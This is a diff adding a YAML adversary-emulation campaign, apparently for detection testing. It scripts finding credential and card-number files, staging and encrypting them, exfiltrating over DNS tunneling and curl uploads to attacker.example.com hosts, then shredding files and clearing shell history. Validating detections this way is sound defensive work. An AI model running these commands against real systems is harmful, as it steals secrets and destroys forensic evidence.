@@ -1,0 +1,128 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: data-staging-exfil
+  adversary: apt1
+  description: "Data staging and exfiltration — collect, compress, encrypt, and exfiltrate sensitive data through multiple channels including DNS tunneling, HTTPS, and cloud storage."
+  objective: "Validate detection of staged data collection, compression/encryption for exfil, and multi-channel exfiltration patterns."
+  mitre_version: "15.1"
+  severity: critical
+  tags: [data-exfiltration, staging, dns-tunneling, encryption, collection]
+  authors: ["ThreatEcho"]
+  created: "2024-10-14"
+  modified: "2025-03-28"
+
+variables:
+  staging_dir: "/tmp/.cache/updates"
+  exfil_domain: "data.attacker.example.com"
+  exfil_bucket: "s3://corp-backup-replica.attacker.example.com"
+  sensitive_paths: "/opt/app/data,/home/shared/finance,/var/lib/db/exports"
+
+stages:
+  - id: sensitive-data-discovery
+    name: Sensitive Data Discovery
+    technique: T1083
+    tactic: collection
+    description: "Locate files containing sensitive data patterns (credit cards, SSNs, API keys, credentials) across mounted filesystems."
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          mkdir -p {{staging_dir}}
+          for path in $(echo "{{sensitive_paths}}" | tr ',' ' '); do
+            find "$path" -type f \( -name "*.csv" -o -name "*.xlsx" -o -name "*.sql" -o -name "*.json" -o -name "*.env" \) \
+              -newer /tmp/.timestamp -exec grep -l -E '([0-9]{4}-){3}[0-9]{4}|AKIA[0-9A-Z]{16}|password|secret' {} \; \
+              >> {{staging_dir}}/targets.txt 2>/dev/null
+          done
+    expect:
+      telemetry: [file_access, process_creation, command_line]
+      detections: [sensitive_file_enumeration, bulk_file_access, data_discovery_pattern]
+    on_failure: continue
+
+  - id: data-staging
+    name: Data Staging and Compression
+    technique: T1074.001
+    tactic: collection
+    description: "Copy discovered sensitive files to a staging directory, compress, and encrypt for exfiltration."
+    depends_on: [sensitive-data-discovery]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          while IFS= read -r f; do
+            cp "$f" {{staging_dir}}/ 2>/dev/null
+          done < {{staging_dir}}/targets.txt
+          cd {{staging_dir}} && tar czf /tmp/.cache/archive.tar.gz --exclude=targets.txt .
+          openssl enc -aes-256-cbc -salt -in /tmp/.cache/archive.tar.gz \
+            -out /tmp/.cache/archive.enc -pass pass:$(hostname)-$(date +%s) 2>/dev/null
+    expect:
+      telemetry: [file_write, process_creation, command_line]
+      detections: [data_staging_detected, bulk_file_copy, archive_encryption_for_exfil]
+    on_failure: continue
+
+  - id: dns-tunnel-exfil
+    name: DNS Tunneling Exfiltration
+    technique: T1048.003
+    tactic: exfiltration
+    description: "Exfiltrate staged data via DNS TXT record queries, encoding file chunks in subdomain labels."
+    depends_on: [data-staging]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          CHUNK_SIZE=63
+          base64 /tmp/.cache/archive.enc | fold -w $CHUNK_SIZE | while IFS= read -r chunk; do
+            dig +short TXT "${chunk}.{{exfil_domain}}" @8.8.8.8 2>/dev/null
+            sleep 0.1
+          done
+    expect:
+      telemetry: [dns_query, network_connection]
+      detections: [dns_tunneling_detected, high_entropy_dns_queries, anomalous_dns_volume, data_exfiltration_via_dns]
+    on_failure: continue
+
+  - id: cloud-exfil-backup
+    name: Cloud Storage Exfiltration Backup
+    technique: T1567.002
+    tactic: exfiltration
+    description: "Exfiltrate data to attacker-controlled cloud storage as a backup channel if DNS tunneling is detected."
+    depends_on: [data-staging]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          split -b 5M /tmp/.cache/archive.enc /tmp/.cache/chunk_
+          for chunk in /tmp/.cache/chunk_*; do
+            curl -s -X PUT "https://storage.attacker.example.com/upload/$(basename $chunk)" \
+              -H "Authorization: Bearer exfil-token-$(date +%s)" \
+              --data-binary @"$chunk"
+            sleep 2
+          done
+    expect:
+      outcome: blocked
+      telemetry: [network_connection, file_read]
+      detections: [cloud_exfiltration_attempt, large_outbound_transfer, unknown_upload_destination]
+    on_failure: continue
+
+  - id: cleanup
+    name: Staging Cleanup
+    technique: T1070.004
+    tactic: defense-evasion
+    description: "Remove staging artifacts and exfiltration traces to hinder forensic analysis."
+    depends_on: [dns-tunnel-exfil, cloud-exfil-backup]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          shred -u /tmp/.cache/archive.tar.gz /tmp/.cache/archive.enc /tmp/.cache/chunk_* 2>/dev/null
+          rm -rf {{staging_dir}}
+          history -c && history -w
+    expect:
+      telemetry: [file_deletion, process_creation, command_line]
+      detections: [staging_cleanup_detected, secure_deletion_tool, history_clearing]
+    on_failure: continue
